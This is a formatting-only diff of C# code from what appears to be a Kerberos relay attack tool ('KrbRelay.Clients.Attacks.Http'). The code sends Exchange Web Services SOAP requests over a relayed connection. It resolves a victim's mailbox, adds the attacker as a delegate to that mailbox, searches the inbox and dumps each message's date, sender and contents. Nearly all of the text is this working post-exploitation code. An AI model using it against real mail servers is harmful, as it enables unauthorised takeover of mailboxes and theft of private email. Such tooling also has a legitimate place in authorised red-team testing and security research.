@@ -16,7 +16,8 @@ namespace KrbRelay.Clients.Attacks.Http
 
         public static string findMailbox(HttpClient httpClient, string user)
         {
-            string soapRequestXML = String.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
+            string soapRequestXML = String.Format(
+                @"<?xml version=""1.0"" encoding=""utf-8"" ?>
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
   <soap:Header>
     <t:RequestServerVersion Version=""{0}"" />
@@ -26,7 +27,11 @@ namespace KrbRelay.Clients.Attacks.Http
         <m:UnresolvedEntry>{1}</m:UnresolvedEntry>
     </m:ResolveNames>
   </soap:Body>
-</soap:Envelope>", exchangeVersion, user); ;
+</soap:Envelope>",
+                exchangeVersion,
+                user
+            );
+            ;
 
             using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
             {
@@ -39,12 +44,18 @@ namespace KrbRelay.Clients.Attacks.Http
                 var result = httpClient.SendAsync(message).Result;
                 if (result.StatusCode == HttpStatusCode.OK)
                 {
-                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    string responseXml = result.Content
+                        .ReadAsStringAsync()
+                        .GetAwaiter()
+                        .GetResult();
                     var xml = XDocument.Parse(responseXml);
                     XmlDocument xdoc = new XmlDocument();
                     xdoc.LoadXml(responseXml);
                     var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
-                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");
+                    nsmgr.AddNamespace(
+                        "t",
+                        "http://schemas.microsoft.com/exchange/services/2006/types"
+                    );
                     XmlNodeList list = xdoc.SelectNodes("//t:EmailAddress", nsmgr);
 
                     if (list[0] != null)
@@ -69,7 +80,8 @@ namespace KrbRelay.Clients.Attacks.Http
                 Console.WriteLine("[*] Found victim email: {0}", vEmail);
             }
 
-            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
+            string soapRequestXML = string.Format(
+                @"<?xml version=""1.0"" encoding=""utf-8"" ?>
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
 <soap:Header>
   <t:RequestServerVersion Version=""{0}"" />
@@ -99,7 +111,11 @@ namespace KrbRelay.Clients.Attacks.Http
 	<m:DeliverMeetingRequests>DelegatesAndSendInformationToMe</m:DeliverMeetingRequests>
   </m:AddDelegate>
 </soap:Body>
-</soap:Envelope>", exchangeVersion, vEmail, user);
+</soap:Envelope>",
+                exchangeVersion,
+                vEmail,
+                user
+            );
 
             using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
             {
@@ -118,10 +134,16 @@ namespace KrbRelay.Clients.Attacks.Http
             }
         }
 
-        public static void readMailbox(HttpClient httpClient, string mailbox = "inbox", string filter = "", int limit = 100)
+        public static void readMailbox(
+            HttpClient httpClient,
+            string mailbox = "inbox",
+            string filter = "",
+            int limit = 100
+        )
         {
             filter = filter.Replace(",", " OR ");
-            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding =""utf-8"" ?>
+            string soapRequestXML = string.Format(
+                @"<?xml version=""1.0"" encoding =""utf-8"" ?>
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
 <soap:Header>
   <t:RequestServerVersion Version=""{0}"" />
@@ -138,7 +160,12 @@ namespace KrbRelay.Clients.Attacks.Http
     <m:QueryString>{3}</m:QueryString>
   </m:FindItem>
 </soap:Body>
-</soap:Envelope>", exchangeVersion, limit, mailbox, filter);
+</soap:Envelope>",
+                exchangeVersion,
+                limit,
+                mailbox,
+                filter
+            );
 
             using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
             {
@@ -152,13 +179,19 @@ namespace KrbRelay.Clients.Attacks.Http
                 Console.WriteLine("[*] resp: " + result.StatusCode);
                 if (result.StatusCode == HttpStatusCode.OK)
                 {
-                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    string responseXml = result.Content
+                        .ReadAsStringAsync()
+                        .GetAwaiter()
+                        .GetResult();
                     //Console.WriteLine(responseXml);
                     var xml = XDocument.Parse(responseXml);
                     XmlDocument xdoc = new XmlDocument();
                     xdoc.LoadXml(responseXml);
                     var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
-                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");
+                    nsmgr.AddNamespace(
+                        "t",
+                        "http://schemas.microsoft.com/exchange/services/2006/types"
+                    );
                     XmlNodeList list = xdoc.SelectNodes("//t:Message", nsmgr);
 
                     Console.WriteLine("[*] Searching in inbox");
@@ -166,7 +199,11 @@ namespace KrbRelay.Clients.Attacks.Http
                     for (int cc = 0; cc < list.Count; cc++)
                     {
                         XmlNode ItemId = list[cc].SelectNodes("//t:ItemId", nsmgr)[cc];
-                        var email = readEmail(httpClient, ItemId.Attributes["Id"].Value, ItemId.Attributes["ChangeKey"].Value);
+                        var email = readEmail(
+                            httpClient,
+                            ItemId.Attributes["Id"].Value,
+                            ItemId.Attributes["ChangeKey"].Value
+                        );
 
                         Console.WriteLine("Date:    {0}", email.Date);
                         Console.WriteLine("From:    {0}", email.From);
@@ -182,7 +219,8 @@ namespace KrbRelay.Clients.Attacks.Http
 
         public static MimeMessage readEmail(HttpClient httpClient, string id, string changeKey)
         {
-            string soapRequestXML = string.Format(@"<?xml version=""1.0"" encoding=""utf-8"" ?>
+            string soapRequestXML = string.Format(
+                @"<?xml version=""1.0"" encoding=""utf-8"" ?>
 <soap:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:m=""http://schemas.microsoft.com/exchange/services/2006/messages"" xmlns:t=""http://schemas.microsoft.com/exchange/services/2006/types"" xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"" >
 <soap:Header>
   <t:RequestServerVersion Version=""{0}"" />
@@ -200,7 +238,11 @@ namespace KrbRelay.Clients.Attacks.Http
 	</m:ItemIds>
   </m:GetItem>
 </soap:Body>
-</soap:Envelope>", exchangeVersion, id, changeKey);
+</soap:Envelope>",
+                exchangeVersion,
+                id,
+                changeKey
+            );
 
             using (var message = new HttpRequestMessage(HttpMethod.Post, "EWS/Exchange.asmx"))
             {
@@ -214,16 +256,26 @@ namespace KrbRelay.Clients.Attacks.Http
                 //Console.WriteLine("[*] resp: " + result.StatusCode);
                 if (result.StatusCode == HttpStatusCode.OK)
                 {
-                    string responseXml = result.Content.ReadAsStringAsync().GetAwaiter().GetResult();
+                    string responseXml = result.Content
+                        .ReadAsStringAsync()
+                        .GetAwaiter()
+                        .GetResult();
                     var xml = XDocument.Parse(responseXml);
                     XmlDocument xdoc = new XmlDocument();
                     xdoc.LoadXml(responseXml);
                     var nsmgr = new XmlNamespaceManager(xdoc.NameTable);
-                    nsmgr.AddNamespace("t", "http://schemas.microsoft.com/exchange/services/2006/types");
+                    nsmgr.AddNamespace(
+                        "t",
+                        "http://schemas.microsoft.com/exchange/services/2006/types"
+                    );
 
                     XmlNodeList mimeXml = xdoc.SelectNodes("//t:MimeContent", nsmgr);
                     MimeMessage mm = new MimeMessage();
-                    using (Stream stream = new MemoryStream(Convert.FromBase64String(mimeXml[0].InnerText)))
+                    using (
+                        Stream stream = new MemoryStream(
+                            Convert.FromBase64String(mimeXml[0].InnerText)
+                        )
+                    )
                     {
                         mm = MimeMessage.Load(stream);
                     }
